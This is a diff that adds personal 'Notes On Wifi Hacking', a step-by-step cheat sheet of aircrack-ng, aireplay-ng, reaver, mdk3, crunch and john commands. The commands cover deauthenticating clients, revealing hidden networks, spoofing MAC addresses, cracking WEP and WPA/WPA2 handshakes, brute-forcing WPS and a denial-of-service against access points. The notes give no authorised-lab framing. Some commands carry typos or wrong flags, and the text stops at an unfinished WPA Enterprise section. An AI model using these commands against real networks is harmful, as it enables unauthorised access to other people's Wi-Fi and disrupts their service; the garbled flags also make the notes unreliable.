@@ -1,0 +1,316 @@
+	Notes On Wifi Hacking
+
+Have a wireless adapter that can inject packets and enter in monitor mode.
+
+CMD to enter.
+How to enter Monitor mode.. 1st way
+
+airmon-ng
+airmon-ng start (name of your wifi adapter (wlan1)) 
+iwconfig wlan1mon
+
+use the name that airmon-ng tells you
+
+airmon-ng stop wlan1mon
+
+-------------
+
+2nd way
+
+ifconfig wlan1mon down
+iwconfig wlan1mon mode monitor
+ifconfig wlan1mon up
+iwconfig wlan1mon
+
+------------------------------
+
+3rd way
+
+ifconfig wlan1mon down
+airmon-ng check kill
+airmon-ng start wlan1mon
+
+----------------------------------------
+
+see and scans the networks the wifi adapter is in range
+
+airodump-ng wlan1mon
+
+now we have our network we want to target
+
+
+airodump-ng --channel6 --bassid 00:11:22:33:44:55 --write test-pizza wlan1mon 
+
+ channel     mac address of target 
+ write tells airodump to log all files
+create a file test-pizza
+name of wifi adapter
+
+
+Deauthentication Attacks
+
+use this to disconnect the target machine.
+we want to disconnect to target machine and than we want to disconnect the target network.
+once we disconnect the target access point we will spoof the access point for the target to connect to us.
+
+aireplay-ng
+aireplay-ng --deauth 1000 -a 33:22:02:33:33:33 -c 44:44:44:88:44:44 wlan1
+
+airodump-ng name of our (adapter)
+
+
+Discover hidden networks
+
+# what networks are hidden <length: 0>
+
+airodump-ng --bssid 33:22:02:33:33:33 --channel 6 wlan1
+
+# disconnect the target and when they are connecting the name will show
+in the 2nd terminal running   airodump-ng --bssid 00:11:22:33:44:55 --channel 6 wlan1 
+ 
+aireplay-ng --deauth 1000 -a 33:22:02:33:33:33 -c 44:44:44:88:44:44 wlan1
+Text editor Geany
+
+
+How to put your computer in managed mode
+ifconfig wlan1 down
+iwconfig wlan1 mode managed 
+ifconfig wlan1 up
+iwconfig wlan1
+
+service network-manager start
+
+bypassing MAC filtering
+run airodump-ng
+airodump-ng --bssid 33:22:02:33:33:33 --channel 6 wlan1
+after running get the target bssid
+
+now spoof your mac address to the client mac address 
+use the mac changer
+
+ifconfig wlan1 down
+macchanger -m 80:80:80:80:80:80
+ifconfig wlan1 up
+
+________
+1st
+Cracking WEP
+128 encryption and 48
+
+airodump-ng wlan1
+        (name of wifi)
+  
+find a ENC that is WEP
+copy the bssid
+airodump-ng --bssid 00:11:22:33:44:55 --channel 11 --write test wlan1
+
+
+open aircrack-ng
+
+aircrack-ng test-01.cap 
+            (file name)
+
+____________________
+2nd
+
+Cracking WEP
+
+Before we can Ininject packets:
+Injecting Packets into traffic we have to Authenicate our wifi card with the AP..
+
+
+Fake Authenicate.
+
+aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h AA:11:BB:00:CC:22 wlan1 
+
+Than 
+
+aireplay-ng --arpreplay 0 -b 00:11:22:33:44:55 -h AA:11:BB:00:CC:22 wlan1 
+                          (bssid)
+
+aircrack-ng (filename from airodump-ng --bssid 00:11:22:33:44:55 --channel 11 --write test wlan1
+)   
+
+aircrack-ng (filename) 
+
+_________________________________
+
+3rd
+
+___________________________
+
+1st
+Wifi Cracking WPA / WPA2
+
+wash -i wlan1
+
+reaver -b 00:11:22:33:44:55 -c 11 -i wlan1
+
+if you need help reaver --help
+
+
+reaver -bssid 00:22:22:00:00:00 -channel 11 -i wlan1
+
+aireplay-ng --fakeauth 100 -a 00:11:22:33:44:55 -h 00:00:00:11:11:11 wlan1
+
+reaver -b 00:11:22:33:44:55 -c 11 -i wlan1 -A
+
+reaver -b 00:11:22:33:44:55 -c 11 -i wlan1 -A -vvv
+
+----------------
+
+Fake Authenicate.
+
+aireplay-ng --fakeauth 100 -a 00:22:22:00:00:00 -h 00:11:22:33:44:55 wlan1
+
+wash -1 wlan1
+
+
+--------------------------------------------------------------------------
+
+WPS Lock
+DOS Attack
+
+mdk3 --help a
+
+mdk3 wlan1 a -a 00:22:22:00:00:00 -m
+
+mdk3 wlan1 a -a 00:22:22:00:00:00 -m
+
+
+__________________________________
+
+Creating a word list
+
+crunch [min][max][characters=lower|upper|numbers|symbols]-o 1wordlist
+
+crunch 6 8 123456789!"$% -o 1wordlist
+
+crunch 6 8 123456789!"$% -o 1wordlist
+
+crunch 4 6 123456@%" -o 5wordlist
+
+
+
+
+ 4 6 123ab -o sample-wordlist
+
+_______________________
+
+To Crack a WPA/ WPA2
+
+1) Need to Capture the Handshake
+
+2) wordlist
+
+3) airodump-ng -b 00:11:22:33:44:55 --c 11 --write tes
+t_hand wlan1
+
+4) disconnect any clients to discover the handshake when they connect again.
+
+5) aireplay-ng --deauth 6 -a 00:22:22:00:00:00 -c 00:11:22:33:44:55 wlan1   
+
+6) Now we have the WPA handshake: 00:22:22:00:00:00 
+
+7) Now  Create a Word List
+
+8) airecrack-ng filename-01.cap -w 
+
+9) aircrack-ng test_hand-01.cap -w 5wordlist
+
+10) using John the ripper to save sessions
+  john --wordlist=name-of-file -- stdout | aircrack-ng -w - -b 00:11:22:33:44:55 name-of-handshake-01.cap
+
+
+john --wordlist=name-of-file -- stdout --sessions=file_to_store| aircrack-ng -w - -b 00:11:22:33:44:55 name-of-handshake-01.cap
+
+john --restore=file_name_stored | aircrack-ng -w - -b 00:11:22:33:44:55 handshake_file-01.cap
+
+
+
+11) Piping Wordlist To Aircrack-ng
+crunch worlist aircrack-ng
+
+crunch 8 8 -o all.txt      this will be a huge file...... this will store on your computer
+
+crunch 8 8 
+
+crunch 8 8 | aircrack-ng -b 00:11:22:33:44:55 -w - handshake_file_name-01.cap
+password min length 8 8
+not using a mins o option we are not saving
+than we are piping to aircrack
+using target bssid
+we are giving a name of the dictornary but only as a - dash and saying we want to use the out put of the perivos command as the output 
+than we are giving it the file that has the handshake
+
+
+
+
+this will not saving file on your computer but it will find the password
+
+
+12) crunch wordlist john modified wordlist aircrack-ng
+
+crunch 8 8 | john --stdin --session=session1-name-of-file --stdout| aircrack-ng -b 00:11:22:33:44:55 -w - handshake-file-01.cap
+
+restore our session
+
+crunch 8 8 | john --restore=session1-name-of-file |aircrack-ng -b 00:11:22:33:44;55 -w - handshake-file-01.cap
+
+13) Speeding the cracking process
+
+Create a ne Data Base
+
+airolib-ng test-ap --import passwd name-of-file
+
+import the bssid
+
+echo "target-point" > test-essid
+cat test-essid
+
+airolib-ng test-db --import essid  name-of-file
+
+airolib-ng test-db --batch
+
+aircrack-ng -r name-of-db name-of-hand-shake-01.cap
+
+
+14) Cracking WPA / WPA2 Using GPU
+
+How to use the GPU
+Need to have a Powerful GPU
+
+Need to use Hashcat
+much easier to do from windowss and not linux because the drivcers for the GPU
+
+GPU Driver Requirements
+
+Download the dumpload the binaries in my c drive it will put the files 
+
+now we have to convert the file handshake-01.cap that is compatible cat file that has the handshake
+now we have the wordlist and the handshake all on the same file..
+
+__________________
+
+15) WPA Enterprise WIFI HAcking
+
+PSK Authentication
+
+
+WPA Enterprise Authentication is managed through a centeral server (Radius Server)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
